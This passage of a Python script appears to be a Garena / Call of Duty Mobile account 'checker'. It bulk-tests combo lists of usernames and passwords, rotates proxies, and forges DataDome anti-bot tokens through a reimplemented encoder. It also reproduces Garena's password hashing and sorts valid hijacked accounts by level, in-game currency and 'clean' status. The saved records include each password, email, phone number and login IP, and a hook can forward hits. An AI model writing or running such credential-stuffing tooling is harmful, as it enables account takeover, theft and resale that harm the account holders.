        tbl.add_row(f'[dim]○ No CODM[/dim]', f"[dim]{stats['no_codm']}[/dim]", _mb(stats['no_codm'], max(stats['valid'], 1), 'magenta'))
        tbl.add_row('', '', '')
        tbl.add_row(f'[dim]▲ Top Clean Lv[/dim]', f"[bold bright_green]{stats['highest_clean_level']}[/bold bright_green]", '')
        tbl.add_row(f'[dim]▲ Top Not Clean Lv[/dim]', f'[bold yellow]{self.highest_not_clean_level}[/bold yellow]', '')
        hs = stats.get('highest_shell', 0)
        hs_color = 'bold bright_yellow' if hs > 0 else 'dim'
        tbl.add_row(f'[dim]◆ Shell[/dim]', f'[{hs_color}]{hs:,}[/{hs_color}]', '')
        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
        if active_games:
            tbl.add_row('', '', '')
            for label, count in active_games:
                tbl.add_row(f'[dim]{label}[/dim]', f'[bold bright_magenta]{count}[/bold bright_magenta]', '')
        return Panel(tbl, title='[bold bright_cyan]◈ CODM LIVE[/bold bright_cyan]', border_style='bright_cyan', box=DOUBLE, padding=(0, 2))

    def display_final_stats(self):
        stats = self.get_stats()
        elapsed = time.time() - self.start_time
        total = self.total_accounts
        proc = self.get_processed_count()
        rate = proc / elapsed if elapsed > 0 else 0
        console = Console()

        results_table = Table(title="[bold bright_cyan]◈ SESSION COMPLETE[/bold bright_cyan]", title_style="bold bright_cyan", box=DOUBLE, border_style="bright_cyan", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
        results_table.add_column("Category", style="dim", no_wrap=True, width=14)
        results_table.add_column("Count", justify="right", style="bright_white", width=10)
        results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
        results_table.add_column("Bar", no_wrap=True)

        denom = max(total, 1)
        for label, count, color in [("✔  Valid", stats['valid'], "bright_green"), ("✖  Invalid", stats['invalid'], "bright_red"), ("·  Errors", stats['error'], "dim")]:
            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, denom), self._rich_bar(count, denom, color, 20))
        results_table.add_row("", "", "", "")

        vd = max(stats['valid'], 1)
        for label, count, color in [("✨  Clean", stats['clean'], "bright_green"), ("⊘  Not Clean", stats['not_clean'], "bright_yellow"), ("◈  Has CODM", stats['has_codm'], "bright_cyan"), ("○  No CODM", stats['no_codm'], "magenta")]:
            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, vd), self._rich_bar(count, vd, color, 20))

        console.print(Panel(results_table, border_style="bright_cyan", box=HEAVY, padding=(0, 1)))

        stats_table = Table(title="[bold bright_yellow]◈ SESSION STATS[/bold bright_yellow]", box=ROUNDED, border_style="bright_yellow", show_header=False, padding=(0, 2), expand=False)
        stats_table.add_column(style="dim", width=16, no_wrap=True)
        stats_table.add_column(style="bright_white", no_wrap=True)

        hs = stats.get('highest_shell', 0)
        hs_style = "bold bright_yellow" if hs > 0 else "dim"
        clean_lvl_style = "bold bright_green" if stats['highest_clean_level'] > 0 else "dim"
        not_clean_lvl_style = "bold bright_yellow" if self.highest_not_clean_level > 0 else "dim"

        for label, val in [("⏱  Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s"), ("⚡  Rate", f"{rate:.2f} acc/s"), ("◈  Processed", f"{proc:,}/{total:,}"), ("▲  Top Clean", f"[{clean_lvl_style}]{stats['highest_clean_level']}[/{clean_lvl_style}]"), ("▲  Top Not Clean", f"[{not_clean_lvl_style}]{self.highest_not_clean_level}[/{not_clean_lvl_style}]"), ("◆  Peak Shell", f"[{hs_style}]{hs:,}[/{hs_style}]")]:
            stats_table.add_row(label, val)

        level_table = Table(title="[bold bright_magenta]◈ LEVEL RANGES[/bold bright_magenta]", box=ROUNDED, border_style="bright_magenta", show_header=True, header_style="bold dim", padding=(0, 1), expand=False)
        level_table.add_column("Range", style="dim", no_wrap=True, width=10)
        level_table.add_column("Clean", justify="right", style="bright_green", width=8)
        level_table.add_column("Bar", no_wrap=True)
        level_table.add_column("Not Clean", justify="right", style="bright_yellow", width=8)
        level_table.add_column("Bar", no_wrap=True)

        clean_lvl = stats['clean_level_counts']
        not_clean_lvl = stats['not_clean_level_counts']
        ct = max(stats['clean'], 1)
        nt = max(stats['not_clean'], 1)

        for rng in ['351-400', '201-350', '101-200', '1-100']:
            cc = clean_lvl.get(rng, 0)
            nc = not_clean_lvl.get(rng, 0)
            level_table.add_row(f"[dim]Lv {rng}[/dim]", f"{cc:,}", self._rich_bar(cc, ct, "bright_green", 12), f"{nc:,}", self._rich_bar(nc, nt, "bright_yellow", 12))

        stats_levels = Columns([stats_table, level_table], expand=False, equal=False, padding=(0, 2))
        console.print(Panel(stats_levels, border_style="bright_yellow", box=ROUNDED, padding=(0, 1)))

        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]

        if active_games:
            games_table = Table(title="[bold bright_cyan]◈ GAMES FOUND[/bold bright_cyan]", box=ROUNDED, border_style="bright_cyan", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
            games_table.add_column("Game", style="dim", no_wrap=True, width=24)
            games_table.add_column("Count", justify="right", style="bright_white", width=8)
            games_table.add_column("Bar", no_wrap=True)
            peak = max(c for _, c in active_games) or 1
            for label, count in active_games:
                games_table.add_row(f"[dim]{label}[/dim]", f"[bright_cyan]{count:,}[/bright_cyan]", self._rich_bar(count, peak, "bright_cyan", 16))
            console.print(Panel(games_table, border_style="bright_cyan", box=ROUNDED, padding=(0, 1)))

        footer_text = Text()
        footer_text.append("⬡  Powered by @Markdev", style="magenta bold")
        console.print(Panel(Align.center(footer_text), border_style="magenta", box=ROUNDED, padding=(0, 1)))
        console.print()

class BulkLiveDashboard:
    MAX_RECENT = 200
    
    def __init__(self, total_accounts: int, max_threads: int = 1):
        self.total = total_accounts
        self.done = self.valid = self.invalid = 0
        self.clean = self.not_clean = 0
        self.codm_present = self.no_codm = 0
        self.lvl_1_100 = self.lvl_101_200 = self.lvl_201_300 = self.lvl_351_400 = 0
        self.highest_shell_balance = 0
        self.highest_clean_level = 0
        self.start_time = time.time()
        self.ip_blocked = False
        self.cooldown_until = 0.0
        self.active_threads = self.max_threads = max_threads
        self.ramp_mode = False
        self.high_hits = deque(maxlen=10)
        self.recent = deque(maxlen=self.MAX_RECENT)
        self.current_proxy = None
        self.current_proxy_line = None
        self._lock = Lock()
        self._spinner_frames = '⣾⣽⣻⢿⡿⣟⣯⣷'
        self._tick = 0
        self._dirty = True
        self._live = None
        self._stop_event = Event()
        self._render_thread = None
    
    def set_current_proxy(self, proxy: str = None, line: int = None):
        with self._lock:
            if proxy:
                self.current_proxy = proxy
            if line is not None:
                self.current_proxy_line = line
            self._dirty = True
    
    def record(self, index: int, account: str, success: bool, is_clean: bool = False, 
               has_codm: bool = False, codm_level: int = 0, shell_balance: int = 0, error_reason: str = ''):
        with self._lock:
            self.done += 1
            n = self.done
            if success:
                self.valid += 1
                if is_clean:
                    self.clean += 1
                else:
                    self.not_clean += 1
                if shell_balance > self.highest_shell_balance:
                    self.highest_shell_balance = shell_balance
                if is_clean and codm_level > self.highest_clean_level:
                    self.highest_clean_level = codm_level
                if has_codm:
                    self.codm_present += 1
                    if codm_level <= 100:
                        self.lvl_1_100 += 1
                    elif codm_level <= 200:
                        self.lvl_101_200 += 1
                    elif codm_level <= 350:
                        self.lvl_201_350 += 1
                    else:
                        self.lvl_350_400 += 1
                    if codm_level >= 100:
                        self.high_hits.appendleft((codm_level, account, is_clean))
                    tag = '[bold green]CLEAN[/bold green]' if is_clean else '[bold yellow]NOT CLEAN[/bold yellow]'
                    detail = f'  [dim]LVL {codm_level}[/dim]' if codm_level else ''
                    line = f'[dim]{n:>4}[/dim]  [green]✓[/green]  [cyan]{account}[/cyan]  {tag}{detail}'
                else:
                    self.no_codm += 1
                    tag = '[bold magenta]NO CODM[/bold magenta] [dim](clean)[/dim]' if is_clean else '[bold magenta]NO CODM[/bold magenta] [dim](not clean)[/dim]'
                    line = f'[dim]{n:>4}[/dim]  [green]✓[/green]  [cyan]{account}[/cyan]  {tag}'
            else:
                self.invalid += 1
                line = f'[dim]{n:>4}[/dim]  [red]✗[/red]  [dim]{account}[/dim]  [red]{error_reason or "Invalid"}[/red]'
            self.recent.append(line)
            self._dirty = True
    
    def set_ip_blocked(self, blocked: bool):
        with self._lock:
            self.ip_blocked = blocked
            self._dirty = True
    
    def set_cooldown(self, seconds: float):
        with self._lock:
            self.cooldown_until = time.time() + seconds if seconds > 0 else 0.0
            self._dirty = True
    
    def set_active_threads(self, n: int, ramp_mode: bool = False):
        with self._lock:
            self.active_threads = n
            self.ramp_mode = ramp_mode
            self._dirty = True
    
    def _render(self) -> Panel:
        with self._lock:
            done, total = self.done, self.total
            valid, invalid = self.valid, self.invalid
            clean, not_clean = self.clean, self.not_clean
            codm_p, no_codm = self.codm_present, self.no_codm
            ip_blocked = self.ip_blocked
            cooldown_left = max(0.0, self.cooldown_until - time.time())
            active, max_thr = self.active_threads, self.max_threads
            l1, l2, l3, l4 = self.lvl_1_100, self.lvl_101_200, self.lvl_201_300, self.lvl_350_400
            hs, hc = self.highest_shell_balance, self.highest_clean_level
            high_hits = list(self.high_hits)
            recent = list(self.recent)
            elapsed = time.time() - self.start_time
            self._tick = (self._tick + 1) % len(self._spinner_frames)
            spinner = self._spinner_frames[self._tick]
            proxy_display = self.current_proxy or 'None'
            if self.current_proxy_line is not None:
                proxy_info = f'[dim]Proxy [{self.current_proxy_line}]:[/dim] [cyan]{proxy_display[:40]}[/cyan]'
            else:
                proxy_info = f'[dim]Proxy:[/dim] [cyan]{proxy_display[:40]}[/cyan]'
            
        pct = done / total * 100 if total else 0
        rate = done / elapsed if elapsed > 0 else 0
        e_str = f'{int(elapsed//3600)}:{int(elapsed%3600//60):02d}:{int(elapsed%60):02d}'
        pc = 'bright_red' if ip_blocked else 'bright_cyan'
        bw = 48
        filled = int(pct / 100 * bw)
        bar = f'[{pc}]{"█"*filled}[/{pc}][dim]{"░"*(bw-filled)}[/dim]'
        ip_badge = f'[bold on red]  ⚠  IP BLOCKED  [/bold on red]' + (f'  [bright_red]{cooldown_left:.0f}s[/bright_red]' if cooldown_left > 0 else '') if ip_blocked else '[bold on green]● NO IP BLOCK[/bold on green]'
        tc = 'bright_green' if active == max_thr else 'bright_red'
        
        def row(label: str, value, color: str = 'white'):
            return Text.from_markup(f'[dim]{label}[/dim]'), Text.from_markup(f'[{color}]{value}[/{color}]')
            
        outer = Table(show_header=False, box=None, padding=(0, 0), expand=True, show_edge=False)
        outer.add_column(no_wrap=True)
        
        hdr = Table(show_header=False, box=None, padding=(0, 2), expand=True, show_edge=False)
        hdr.add_column(ratio=1)
        hdr.add_column(ratio=1)
        hdr.add_column(ratio=1)
        hdr.add_row(Text.from_markup(f'[dim]elapsed[/dim] [white]{e_str}[/white]'), Text.from_markup(f'[{tc}]⚙ {active}/{max_thr} threads[/{tc}]', justify='center'), Text.from_markup(ip_badge, justify='right'))
        outer.add_row(Panel(hdr, border_style='grey30', box=ROUNDED, padding=(0, 1), expand=True))
        
        proxy_row = Table(show_header=False, box=None, padding=(0, 2), expand=True, show_edge=False)
        proxy_row.add_column(ratio=1)
        proxy_row.add_row(Text.from_markup(proxy_info))
        outer.add_row(Panel(proxy_row, border_style='cyan', box=ROUNDED, padding=(0, 1), expand=True))
        
        prog = Table(show_header=False, box=None, padding=(0, 1), expand=True, show_edge=False)
        prog.add_column(no_wrap=True)
        prog.add_row(Text.from_markup(f'[bright_cyan]{spinner}[/bright_cyan]  {bar}  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  [dim]{done}/{total}[/dim]  [dim]{rate:.1f}/s[/dim]'))
        outer.add_row(Panel(prog, border_style=pc, box=ROUNDED, padding=(0, 1), expand=True))
        
        left = Table(show_header=False, box=None, padding=(0, 1), expand=True, show_edge=False)
        left.add_column(width=14, no_wrap=True)
        left.add_column(no_wrap=True)
        for label, val, color in [('TOTAL', done, 'bold white'), ('VALID', valid, 'bold bright_green'), ('INVALID', invalid, 'bold bright_red'), ('CLEAN', clean, 'bold bright_green'), ('NOT CLEAN', not_clean, 'bold yellow'), ('CODM', codm_p, 'bold bright_cyan'), ('NO CODM', no_codm, 'dim')]:
            left.add_row(*row(label, val, color))
            
        right = Table(show_header=False, box=None, padding=(0, 1), expand=True, show_edge=False)
        right.add_column(width=16, no_wrap=True)
        right.add_column(no_wrap=True)
        for label, val, color in [('LVL 1-100', l1, 'white'), ('LVL 101-200', l2, 'bright_cyan'), ('LVL 201-300', l3, 'bold bright_cyan'), ('LVL 350-400', l4, 'bold bright_yellow')]:
            right.add_row(*row(label, val, color))
        right.add_row(Text(''), Text(''))
        for label, val, color in [('PEAK SHELL', hs or 'N/A', 'bold bright_yellow'), ('PEAK CLEAN', hc or 'N/A', 'bold bright_green')]:
            right.add_row(*row(label, val, color))
            
        two_col = Table(show_header=False, box=None, padding=(0, 0), expand=True, show_edge=False)
        two_col.add_column(ratio=1)
        two_col.add_column(ratio=1)
        two_col.add_row(Panel(left, title='[dim]STATS[/dim]', border_style='bright_blue', box=ROUNDED, padding=(0, 1), expand=True), Panel(right, title='[dim]LEVEL[/dim]', border_style='bright_blue', box=ROUNDED, padding=(0, 1), expand=True))
        outer.add_row(two_col)
        
        hits = Table(show_header=False, box=None, padding=(0, 1), expand=True, show_edge=False)
        hits.add_column(width=6, no_wrap=True)
        hits.add_column(no_wrap=True)
        if high_hits:
            for lvl, acc, is_clean in high_hits[:7]:
                hits.add_row(Text.from_markup(f'[{"bold bright_green" if is_clean else "bold bright_yellow"}]{lvl:>3}[/{"bold bright_green" if is_clean else "bold bright_yellow"}]'), Text.from_markup(f'[dim]{acc if len(acc)<=36 else acc[:34]+"…"}[/dim]'))
        else:
            hits.add_row(Text(''), Text.from_markup('[dim]No high level hits yet[/dim]'))
        outer.add_row(Panel(hits, title='[dim]TOP HITS  LVL 100+[/dim]', border_style='bright_yellow', box=ROUNDED, padding=(0, 1), expand=True))
        
        log = Table(show_header=False, box=None, padding=(0, 1), expand=True, show_edge=False)
        log.add_column(no_wrap=True)
        for line in (list(recent)[-12:] if recent else ['[dim]Waiting for results...[/dim]']):
            log.add_row(Text.from_markup(line))
        outer.add_row(Panel(log, title='[dim]LIVE LOG[/dim]', border_style='bright_magenta', box=ROUNDED, padding=(0, 1), expand=True))
        
        return Panel(outer, title='[bold bright_magenta] CODM CHECKER  @Markdev [/bold bright_magenta]', border_style='bright_red' if ip_blocked else 'bright_cyan', box=HEAVY, padding=(0, 1))
    
    def start(self):
        self._stop_event.clear()
        self._live = Live(console=Console(), refresh_per_second=0.5, screen=True)
        self._live.start()
        self._render_thread = threading.Thread(target=self._render_loop, daemon=True)
        self._render_thread.start()
    
    def _render_loop(self):
        while not self._stop_event.is_set():
            if self._dirty:
                self._live.update(self._render())
                with self._lock:
                    self._dirty = False
            time.sleep(0.016)
    
    def stop(self):
        self._stop_event.set()
        if self._render_thread:
            self._render_thread.join(timeout=0.5)
        if self._live:
            self._live.stop()
    
    def render(self) -> Panel:
        return self._render()

class ResultsManager:
    def __init__(self, combo_file_path, create_dirs=True):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/{self.combo_file_name}_{self.timestamp}')
        if create_dirs:
            for sub in ('Country', 'Level', 'Garena Shells'):
                (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
            if CHECK_OTHER_GAMES:
                (self.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        import re as _re
        m = _re.search('Account Level:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

    @staticmethod
    def _entry_shell(entry):
        import re as _re
        m = _re.search('Garena Shell:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

    def _write_sorted(self, filepath, new_entry_body, sort_by='level'):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with self._get_flock(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n' + '-' * 60 + '\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('-' * 60):
                            raw_entry = raw_entry[len('-' * 60):].strip()
                        if raw_entry.endswith('-' * 60):
                            raw_entry = raw_entry[:-len('-' * 60)].strip()
                        entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry.startswith('-' * 60):
                new_entry = new_entry[len('-' * 60):].strip()
            if new_entry.endswith('-' * 60):
                new_entry = new_entry[:-len('-' * 60)].strip()
            entries.append(new_entry)
            
            if sort_by == 'shell':
                entries.sort(key=self._entry_shell, reverse=True)
            else:
                entries.sort(key=self._entry_level, reverse=True)
            
            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('-' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '-' * 60)
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
        return cleaned or 'N/A'

    def _format_server(self, region_code):
        if not region_code or region_code == 'N/A':
            return 'N/A'
        _region_info = CODM_REGIONS.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
        return f"{_region_info['flag']} {_region_info['name']} ({region_code})" if _region_info else str(region_code)

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return '-' * 60 + f"\nAccount: {acct} : {pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '-' * 60
        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)
        
        base_lines = [
            '-' * 60, f'Account: {acct} : {pwd}', f'UID: {account_data.get("uid", "N/A")}',
            f'Username: {self._ascii(account_data.get("username", "N/A"))}',
            f'Garena Shell: {account_data.get("shell_balance", 0)}',
            f'Email: {account_data.get("email_display", "N/A")}',
            f'Mobile: {account_data.get("formatted_mobile", "N/A")}',
            f'Country: {account_data.get("country", "N/A")}',
            f'Nickname: {self._ascii(account_data.get("nickname", "N/A"))}',
            '', '--- Facebook Information ---',
            f'Facebook Username: {self._ascii(account_data.get("fb_username", "N/A"))}',
            f'Facebook Link: {account_data.get("fb_link", "N/A")}',
            f'Facebook Status: {account_data.get("fb_info", "N/A")}',
            '', '--- Login History ---',
            f'Last Login: {account_data.get("last_login_date", "N/A")}',
            f'Last Login From: {account_data.get("last_login_where", "N/A")}',
            f'Last Login IP: {account_data.get("last_login_ip", "N/A")}',
            f'Last Login Country: {account_data.get("last_login_country", "N/A")}',
            '', f'Account Status: {("Clean" if is_clean else "Not Clean")}',
            '', 'Powered by: @Markdev', '-' * 60
        ]
        
        if not has_codm:
            return '\n'.join(base_lines)
        
        codm_lines = [
            '--- CODM Information ---',
            f'Account Level: {account_data.get("codm_level", "N/A")}',
            f'Server: {self._format_server(account_data.get("codm_region", "N/A"))}',
            f'IGN: {self._ascii(account_data.get("codm_nickname", "N/A"))}',
            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}', ''
        ]
        
        login_index = base_lines.index('--- Login History ---')
        final_lines = base_lines[:login_index] + codm_lines + base_lines[login_index:]
        return '\n'.join(final_lines)

    def add_account(self, account_data):
        if _TG_HOOK and (not account_data.get('is_error')):
            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        entry = self._format_account(account_data, index=self._next_index())
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        timestamp = self.timestamp
        
        self._write_sorted(self.base_dir / f'All_Accounts_{timestamp}.txt', entry)
        self._append_line(self.base_dir / f'Valid_Accounts_{timestamp}.txt', combo)
        
        if is_clean and has_codm:
            self._write_sorted(self.base_dir / f'Clean_Accounts_{timestamp}.txt', entry)
        elif has_codm:
            self._write_sorted(self.base_dir / f'Not_Clean_Accounts_{timestamp}.txt', entry)
        
        if not has_codm:
            self._write_sorted(self.base_dir / f'NO_CODM_Accounts_{timestamp}.txt', entry)
            if shell > 0:
                self._write_sorted(self.base_dir / 'Garena Shells' / f'NO_CODM_Shells_{timestamp}.txt', entry, sort_by='shell')
            return
        
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country}_Accounts_{timestamp}.txt', entry)
        
        try:
            lvl = int(account_data.get('codm_level', 0) or 0)
        except (ValueError, TypeError):
            lvl = 0
        bucket = '1-100_{timestamp}.txt' if lvl <= 100 else '101-200_{timestamp}.txt' if lvl <= 200 else '201-350_{timestamp}.txt' if lvl <= 350 else '351-400_{timestamp}.txt'
        self._write_sorted(self.base_dir / 'Level' / bucket, entry)
        
        if shell > 0:
            self._write_sorted(self.base_dir / 'Garena Shells' / f'CODM_Shells_{timestamp}.txt', entry, sort_by='shell')

_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None

class ProxyManager:
    def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
        self.enabled = enabled
        self.proxies = []
        self._index = 0
        self._counter = 0
        self._lock = threading.Lock()
        
        if not enabled:
            return
            
        if fallback_url:
            self.proxies = [fallback_url]
        elif proxy_file and Path(proxy_file).exists():
            self._load_from_file(proxy_file)

    def _load_from_file(self, proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = _parse_proxy_line(line)
                if url:
                    self.proxies.append(url)

    def get_next(self):
        if not self.enabled or not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            self._counter += 1
        return {'http': proxy, 'https': proxy}

    def is_loaded(self):
        return self.enabled and len(self.proxies) > 0

    def get_count(self):
        return len(self.proxies)

class CookieManager:

    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))

    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()

    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {'_ga': f'GA1.1.{random_id}.{timestamp}', '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0', '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'}
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

class DataDomeGenerator:

    def init(self, key: str, cookie: str):
        self.key = key
        self.cookie = cookie
        self.t = 9959949970
        self.n = 1789537805

    def _hash_str_to_int(self, s: str) -> int:
        if not s:
            return self.n
        o = 0
        for char in s:
            o = (o << 5) - o + ord(char) & 4294967295
        return o

    def _prng_h(self, n: int) -> int:
        n ^= n << 13
        n ^= n >> 17 & 4294967295
        n ^= n << 5
        return n & 4294967295

    def _create_keystream_generator(self, seed1: int, seed2: int):
        e = seed1
        i = -1
        r = seed2
        a = True
        u = None

        def generator(get_val: bool=False) -> int:
            nonlocal e, i, r, a, u
            if u is not None:
                t = u
                u = None
                return t
            i += 1
            if i > 2:
                e = self._prng_h(e)
                i = 0
            t = e >> 16 - 8 * i & 255
            if a:
                r -= 1
                t ^= r & 255
            if get_val:
                u = t
            return t
        a = False
        return generator

    def _custom_b64_encode_char(self, n: int) -> int:
        if 37 < n:
            return 59 + n
        if 11 < n:
            return 53 + n
        if 1 < n:
            return 46 + n
        return 50 * n + 45

    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
        seed_from_cookie = self._hash_str_to_int(self.cookie)
        initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
        e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
        keystream_gen_a = self._create_keystream_generator(initial_seed, e)
        payload_bytes = []
        is_first = True

        def stringify(val: Any) -> str:
            return json.dumps(val)

        def encrypt_str(s: str) -> List[int]:
            buffer = s.encode('utf-8')
            encrypted = []
            for byte in buffer:
                encrypted.append(byte ^ keystream_gen_a())
            return encrypted
        for key, value in data.items():
            if not is_first:
                payload_bytes.append(keystream_gen_a() ^ 44)
            key_bytes = encrypt_str(stringify(key))
            value_bytes = encrypt_str(stringify(value))
            payload_bytes.extend(key_bytes)
            payload_bytes.append(keystream_gen_a() ^ 58)
            payload_bytes.extend(value_bytes)
            is_first = False
        keystream_gen_b = self._create_keystream_generator(1809053797 ^ self._hash_str_to_int(self.cookie), e)
        final_bytes = [byte ^ keystream_gen_b() for byte in payload_bytes]
        final_bytes.append(keystream_gen_a(True) ^ 125 ^ keystream_gen_b())
        result_chars = []
        w = 0
        b = e
        while w < len(final_bytes):
            b = b - 1 & 4294967295
            byte1 = b & 255 ^ final_bytes[w]
            w += 1
            b = b - 1 & 4294967295
            byte2 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            b = b - 1 & 4294967295
            byte3 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            z = byte1 << 16 | byte2 << 8 | byte3
            result_chars.append(chr(self._custom_b64_encode_char(z >> 18 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 12 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 6 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z & 63)))
        padding = len(final_bytes) % 3
        if padding > 0:
            return ''.join(result_chars[:-(3 - padding)])
        return ''.join(result_chars)

class DataDomeManager:

    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
